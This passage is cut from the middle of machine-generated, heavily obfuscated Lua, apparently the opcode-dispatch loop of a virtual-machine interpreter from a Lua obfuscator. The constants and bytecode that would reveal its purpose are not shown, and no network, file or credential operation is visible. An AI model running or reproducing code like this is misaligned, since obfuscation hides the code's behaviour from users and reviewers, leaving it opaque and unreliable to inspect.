e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];elseif c>116 then local D;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];else local D;local a;local c;local C;local A;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];end;elseif c<=120 then if c<=118 then local A,A;local D;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D,a=J(e[c](r(C,1,a-c)));a=a+c-1;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];c=o[2];C={};A=0;a=B;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];elseif c>119 then e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];for o=o[2],o[3]do e[o]=nil;end;d=d+1;o=l[d];if(n[o[2]]<=e[o[5]])then d=d+1;else d=d+o[3];end;else e[o[2]]=(o[3]~=0);d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=(o[3]~=0);d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=(o[3]~=0);d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=(o[3]~=0);end;elseif c<=121 then local D;local a;local c;local C;local A;e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;elseif c>122 then if(e[o[2]]~=n[o[5]])then d=d+1;else d=d+o[3];end;else local J;local a;local A;local D;local c;e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];D={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;D[A]=e[o];end;J={e[c](r(D,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=J[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];do return end;end;elseif c<=144 then if c<=133 then if c<=128 then if c<=125 then if c>124 then local D;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];else e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];if(e[o[2]]==e[o[5]])then d=d+1;else d=d+o[3];end;end;elseif c<=126 then local J;local a;local c;local C;local D;local A;A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];elseif c==127 then if not e[o[2]]then d=d+1;else d=d+o[3];end;else e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];end;elseif c<=130 then if c>129 then local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do 